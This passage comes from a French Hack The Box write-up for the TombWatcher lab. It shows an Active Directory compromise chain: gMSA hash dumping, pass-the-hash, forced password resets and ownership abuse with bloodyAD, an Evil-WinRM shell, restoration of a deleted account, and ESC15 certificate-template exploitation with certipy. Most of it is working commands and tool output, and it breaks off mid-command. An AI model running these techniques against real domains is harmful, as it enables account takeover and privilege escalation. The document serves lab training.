+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gMSADumper.py -d <span class="s1">&#39;tombwatcher.htb&#39;</span> -u <span class="s1">&#39;alfred&#39;</span> -p <span class="s1">&#39;basketball&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/10.png"
+        data-srcset="/images/TombWatcher/10.png, /images/TombWatcher/10.png 1.5x, /images/TombWatcher/10.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/10.png"
+        title="/images/TombWatcher/10.png" width="1230" height="281" /></p>
+<p>Les identifiants sont valides.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc smb tombwatcher.htb -u <span class="s1">&#39;ansible_dev$&#39;</span> -H <span class="s1">&#39;1c37d00093dc2a5f25176bf2d474afdc&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/9.png"
+        data-srcset="/images/TombWatcher/9.png, /images/TombWatcher/9.png 1.5x, /images/TombWatcher/9.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/9.png"
+        title="/images/TombWatcher/9.png" width="1893" height="228" /></p>
+<h2 id="forcechangepassword">ForceChangePassword</h2>
+<p>Maintenant que j&rsquo;ai les identifiants du compte <code>ansible_dev$</code>, je peux changer le mot de passe de l&rsquo;utilisateur <code>sam</code> avec <code>bloodyAD</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD --host <span class="s1">&#39;10.129.25.88&#39;</span> -u <span class="s1">&#39;ansible_dev$&#39;</span> -p <span class="s1">&#39;:1c37d00093dc2a5f25176bf2d474afdc&#39;</span> <span class="nb">set</span> password <span class="s1">&#39;sam&#39;</span> <span class="s1">&#39;Password@2025&#39;</span></span></span></code></pre></div></div>
+<p>Avec la commande suivante, je vérifie que la modification est effective.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc smb tombwatcher.htb -u <span class="s1">&#39;sam&#39;</span> -p <span class="s1">&#39;Password@2025&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/11.png"
+        data-srcset="/images/TombWatcher/11.png, /images/TombWatcher/11.png 1.5x, /images/TombWatcher/11.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/11.png"
+        title="/images/TombWatcher/11.png" width="1883" height="304" /></p>
+<h2 id="writeowner">WriteOwner</h2>
+<p>Les étapes sont les suivantes :</p>
+<ol>
+<li>Changer le propriétaire de John en Sam.</li>
+<li>Accorder à Sam le contrôle total de John.</li>
+<li>Modifier le mot de passe de John.
+Avec Sam, j&rsquo;ai changé la propriété de l&rsquo;utilisateur John. Sam est désormais propriétaire de John.</li>
+</ol>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">owneredit.py -action write -new-owner <span class="s2">&#34;sam&#34;</span> -target <span class="s2">&#34;john&#34;</span> <span class="s2">&#34;tombwatcher.htb&#34;</span>/<span class="s2">&#34;sam&#34;</span>:<span class="s1">&#39;Password@2025&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/12.png"
+        data-srcset="/images/TombWatcher/12.png, /images/TombWatcher/12.png 1.5x, /images/TombWatcher/12.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/12.png"
+        title="/images/TombWatcher/12.png" width="1225" height="309" /></p>
+<p>Ensuite, j&rsquo;attribue le contrôle total de John à Sam.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD --host <span class="s2">&#34;10.129.25.88&#34;</span> -d <span class="s2">&#34;tombwatcher.htb&#34;</span> -u <span class="s1">&#39;sam&#39;</span> -p <span class="s1">&#39;Password@2025&#39;</span> add genericAll <span class="s2">&#34;john&#34;</span> <span class="s2">&#34;sam&#34;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/13.png"
+        data-srcset="/images/TombWatcher/13.png, /images/TombWatcher/13.png 1.5x, /images/TombWatcher/13.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/13.png"
+        title="/images/TombWatcher/13.png" width="1340" height="168" /></p>
+<p>Maintenant que Sam a le contrôle total sur John, il peut changer son mot de passe.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD --host <span class="s1">&#39;10.129.25.88&#39;</span> -u <span class="s1">&#39;sam&#39;</span> -p <span class="s1">&#39;Password@2025&#39;</span> <span class="nb">set</span> password <span class="s1">&#39;john&#39;</span> <span class="s1">&#39;Password@2025&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/14.png"
+        data-srcset="/images/TombWatcher/14.png, /images/TombWatcher/14.png 1.5x, /images/TombWatcher/14.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/14.png"
+        title="/images/TombWatcher/14.png" width="1186" height="165" /></p>
+<p>Le changement de mot de passe est effectif. Nous pouvons désormais obtenir un shell en tant que John.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/15.png"
+        data-srcset="/images/TombWatcher/15.png, /images/TombWatcher/15.png 1.5x, /images/TombWatcher/15.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/15.png"
+        title="/images/TombWatcher/15.png" width="1567" height="202" /></p>
+<h2 id="evil-winrm">Evil-WinRM</h2>
+<p>J&rsquo;obtiens un shell en tant que John et j&rsquo;obtiens le flag user.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">evil-winrm -i 10.129.25.88 -u <span class="s1">&#39;john&#39;</span> -p <span class="s1">&#39;Password@2025&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/16.png"
+        data-srcset="/images/TombWatcher/16.png, /images/TombWatcher/16.png 1.5x, /images/TombWatcher/16.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/16.png"
+        title="/images/TombWatcher/16.png" width="704" height="565" /></p>
+<h1 id="shell-as-administrator">Shell as administrator</h1>
+<h2 id="cert_admin-recover">cert_admin recover</h2>
+<p>Je ne connais pas le raisonnement des autres, mais pour moi, et d&rsquo;après mon expérience, si je vois un utilisateur disposant de droits sur une Unité d&rsquo;Organisation, que ce soit directement ou implicitement via des groupes avec autorisations déléguées (ACL), je vérifie systématiquement les objets supprimés. On ne sait jamais de quoi il s&rsquo;agit ni ce qu&rsquo;ils autorisent, et dans ce cas précis, il existe une chaîne de transmission potentiellement abusive pouvant mener à une compromission. C&rsquo;est un constat que j&rsquo;ai tiré de mes expériences.
+Je liste alors tous les objets supprimés. Il existe trois comptes <code>cert_admin</code>. L&rsquo;un d&rsquo;eux devrait être utile pour les étapes suivantes.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Get-ADObject -Filter <span class="s1">&#39;Isdeleted -eq $true&#39;</span> -IncludeDeletedObjects</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/17.png"
+        data-srcset="/images/TombWatcher/17.png, /images/TombWatcher/17.png 1.5x, /images/TombWatcher/17.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/17.png"
+        title="/images/TombWatcher/17.png" width="1425" height="708" /></p>
+<p>J&rsquo;utilise <code>certipy</code> pour obtenir les templates et le certificat sous le nom de <strong>John</strong>. Cela m&rsquo;a fourni le <strong>SID</strong> du compte que je dois utiliser pour demander des certificats.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy find -u <span class="s1">&#39;john@tombwatcher.htb&#39;</span> -p <span class="s1">&#39;Password@2025&#39;</span> -dc-ip <span class="s1">&#39;10.129.242.219&#39;</span> -stdout -debug</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/18.png"
+        data-srcset="/images/TombWatcher/18.png, /images/TombWatcher/18.png 1.5x, /images/TombWatcher/18.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/18.png"
+        title="/images/TombWatcher/18.png" width="1906" height="447" /></p>
+<p>Maintenant que j&rsquo;ai le <strong>SID</strong>, je peux le comparer à ceux des comptes <code>cert_admin</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Get-ADObject -Filter <span class="s1">&#39;isDeleted -eq $true&#39;</span> -IncludeDeletedObjects -Properties *</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/19.png"
+        data-srcset="/images/TombWatcher/19.png, /images/TombWatcher/19.png 1.5x, /images/TombWatcher/19.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/19.png"
+        title="/images/TombWatcher/19.png" width="1574" height="949" /></p>
+<p>Je restaure le compte à l&rsquo;aide du <strong>GUID (Identifiant de Groupe)</strong>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Restore-ADObject -Identity <span class="s2">&#34;938182c3-bf0b-410a-9aaa-45c8e1a02ebf&#34;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/21.png"
+        data-srcset="/images/TombWatcher/21.png, /images/TombWatcher/21.png 1.5x, /images/TombWatcher/21.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/21.png"
+        title="/images/TombWatcher/21.png" width="1292" height="88" /></p>
+<p>J&rsquo;active ensuite le compte.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Enable-ADAccount</span> <span class="n">-Identity</span> <span class="n">cert_admin</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/24.png"
+        data-srcset="/images/TombWatcher/24.png, /images/TombWatcher/24.png 1.5x, /images/TombWatcher/24.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/24.png"
+        title="/images/TombWatcher/24.png" width="968" height="80" /></p>
+<p>Avec la commande suivante, je vérifie que l&rsquo;activation est effective.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Get-ADUser -Identity cert_admin -Properties Enabled</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/20.png"
+        data-srcset="/images/TombWatcher/20.png, /images/TombWatcher/20.png 1.5x, /images/TombWatcher/20.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/20.png"
+        title="/images/TombWatcher/20.png" width="1127" height="342" /></p>
+<p>Je change ensuite le mot de passe de <code>cert_admin</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword <span class="o">(</span>ConvertTo-SecureString -AsPlainText <span class="s2">&#34;Password@2025&#34;</span> -Force<span class="o">)</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/22.png"
+        data-srcset="/images/TombWatcher/22.png, /images/TombWatcher/22.png 1.5x, /images/TombWatcher/22.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/22.png"
+        title="/images/TombWatcher/22.png" width="1887" height="110" /></p>
+<p>Les identifiants sont valides.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc smb tombwatcher.htb -u <span class="s1">&#39;cert_admin&#39;</span> -p <span class="s1">&#39;Password@2025&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/23.png"
+        data-srcset="/images/TombWatcher/23.png, /images/TombWatcher/23.png 1.5x, /images/TombWatcher/23.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/23.png"
+        title="/images/TombWatcher/23.png" width="1888" height="219" /></p>
+<h2 id="esc15---plan-b">ESC15 - Plan B</h2>
+<p>Avec <code>certipy</code>, j’énumère les templates vulnérables. Afin de pouvoir détecter l&rsquo;<code>ESC15</code>, il faut une une version de <code>certipy</code> supérieure ou égale à la <strong>5.0.0</strong>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>root@exegol-htb<span class="o">]</span> /workspace
+</span></span><span class="line"><span class="cl">❯ certipy find -u <span class="s1">&#39;cert_admin@tombwatcher.htb&#39;</span> -p <span class="s1">&#39;Password@2025&#39;</span> -dc-ip <span class="s1">&#39;10.10.11.72&#39;</span> -vulnerable -stdout
+</span></span><span class="line"><span class="cl">Certipy v5.0.3 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">33</span> certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate authorities
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">1</span> certificate authority
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">11</span> enabled certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding issuance policies
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">13</span> issuance policies
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">0</span> OIDs linked to templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Retrieving CA configuration <span class="k">for</span> <span class="s1">&#39;tombwatcher-CA-1&#39;</span> via RRP
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully retrieved CA configuration <span class="k">for</span> <span class="s1">&#39;tombwatcher-CA-1&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Checking web enrollment <span class="k">for</span> CA <span class="s1">&#39;tombwatcher-CA-1&#39;</span> @ <span class="s1">&#39;DC01.tombwatcher.htb&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Error checking web enrollment: timed out
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Use -debug to print a stacktrace
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Enumeration output:
+</span></span><span class="line"><span class="cl">Certificate Authorities
+</span></span><span class="line"><span class="cl">  <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    CA Name                             : tombwatcher-CA-1
+</span></span><span class="line"><span class="cl">    DNS Name                            : DC01.tombwatcher.htb
+</span></span><span class="line"><span class="cl">    Certificate Subject                 : <span class="nv">CN</span><span class="o">=</span>tombwatcher-CA-1, <span class="nv">DC</span><span class="o">=</span>tombwatcher, <span class="nv">DC</span><span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
+</span></span><span class="line"><span class="cl">    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
+</span></span><span class="line"><span class="cl">    Certificate Validity End            : 2123-11-16 00:57:48+00:00
+</span></span><span class="line"><span class="cl">    Web Enrollment
+</span></span><span class="line"><span class="cl">      HTTP
+</span></span><span class="line"><span class="cl">        Enabled                         : False
+</span></span><span class="line"><span class="cl">      HTTPS
+</span></span><span class="line"><span class="cl">        Enabled                         : False
+</span></span><span class="line"><span class="cl">    User Specified SAN                  : Disabled
+</span></span><span class="line"><span class="cl">    Request Disposition                 : Issue
+</span></span><span class="line"><span class="cl">    Enforce Encryption <span class="k">for</span> Requests     : Enabled
+</span></span><span class="line"><span class="cl">    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Owner                             : TOMBWATCHER.HTB<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">      Access Rights
+</span></span><span class="line"><span class="cl">        ManageCa                        : TOMBWATCHER.HTB<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        ManageCertificates              : TOMBWATCHER.HTB<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        Enroll                          : TOMBWATCHER.HTB<span class="se">\A</span>uthenticated Users
+</span></span><span class="line"><span class="cl">Certificate Templates
+</span></span><span class="line"><span class="cl">  <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    Template Name                       : WebServer
+</span></span><span class="line"><span class="cl">    Display Name                        : Web Server
+</span></span><span class="line"><span class="cl">    Certificate Authorities             : tombwatcher-CA-1
+</span></span><span class="line"><span class="cl">    Enabled                             : True
+</span></span><span class="line"><span class="cl">    Client Authentication               : False
+</span></span><span class="line"><span class="cl">    Enrollment Agent                    : False
+</span></span><span class="line"><span class="cl">    Any Purpose                         : False
+</span></span><span class="line"><span class="cl">    Enrollee Supplies Subject           : True
+</span></span><span class="line"><span class="cl">    Certificate Name Flag               : EnrolleeSuppliesSubject
+</span></span><span class="line"><span class="cl">    Extended Key Usage                  : Server Authentication
+</span></span><span class="line"><span class="cl">    Requires Manager Approval           : False
+</span></span><span class="line"><span class="cl">    Requires Key Archival               : False
+</span></span><span class="line"><span class="cl">    Authorized Signatures Required      : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    Schema Version                      : <span class="m">1</span>
+</span></span><span class="line"><span class="cl">    Validity Period                     : <span class="m">2</span> years
+</span></span><span class="line"><span class="cl">    Renewal Period                      : <span class="m">6</span> weeks
+</span></span><span class="line"><span class="cl">    Minimum RSA Key Length              : <span class="m">2048</span>
+</span></span><span class="line"><span class="cl">    Template Created                    : 2024-11-16T00:57:49+00:00
+</span></span><span class="line"><span class="cl">    Template Last Modified              : 2024-11-16T17:07:26+00:00
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Enrollment Permissions
+</span></span><span class="line"><span class="cl">        Enrollment Rights               : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\c</span>ert_admin
+</span></span><span class="line"><span class="cl">      Object Control Permissions
+</span></span><span class="line"><span class="cl">        Owner                           : TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        Full Control Principals         : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        Write Owner Principals          : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        Write Dacl Principals           : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        Write Property Enroll           : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\c</span>ert_admin
+</span></span><span class="line"><span class="cl">    <span class="o">[</span>+<span class="o">]</span> User Enrollable Principals      : TOMBWATCHER.HTB<span class="se">\c</span>ert_admin
+</span></span><span class="line"><span class="cl">    <span class="o">[</span>!<span class="o">]</span> Vulnerabilities
+</span></span><span class="line"><span class="cl">      ESC15                             : Enrollee supplies subject and schema version is 1.
+</span></span><span class="line"><span class="cl">    <span class="o">[</span>*<span class="o">]</span> Remarks
+</span></span><span class="line"><span class="cl">      ESC15                             : Only applicable <span class="k">if</span> the environment has not been patched. See CVE-2024-49019 or the wiki <span class="k">for</span> more details.</span></span></code></pre></div></div>
+<p>L&rsquo;<code>ESC15</code> décrit une vulnérabilité affectant les autorités de certification (CA) non corrigées. Elle permet à un attaquant d’injecter des <strong>Application Policies arbitraires</strong> dans un certificat émis à partir d’un modèle de certificat <strong>Version 1 (Schema V1)</strong>. J&rsquo;utilise alors <a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu" target="_blank" rel="noopener noreffer ">Certipy Wiki</a> afin de pouvoir l&rsquo;exploiter du <strong>scénario B</strong> de l&rsquo;<code>ESC15</code>. Ce scénario consiste d’abord à obtenir un certificat d’agent en injectant la politique *<em>Certificate Request Agent</em>, puis à s’en servir pour demander un certificat au nom d’un utilisateur privilégié.</p>
+<p>Premièrement, je fais une demande de certificat en injectant la stratégie d&rsquo;application « <strong>Certificate Request Agent</strong> ». Ce certificat permet à <code>cert_admin</code> de devenir agent d&rsquo;inscription.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy req <span class="se">\
+</span></span></span><span class="line"><span class="cl">    -u <span class="s1">&#39;cert_admin@tombwatcher.htb&#39;</span> -p <span class="s1">&#39;Password@2025&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">    -dc-ip <span class="s1">&#39;10.10.11.72&#39;</span> -target <span class="s1">&#39;dc01.tombwatcher.htb&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">    -ca <span class="s1">&#39;tombwatcher-CA-1&#39;</span> -template <span class="s1">&#39;WebServer&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">    -application-policies <span class="s1">&#39;Certificate Request Agent&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
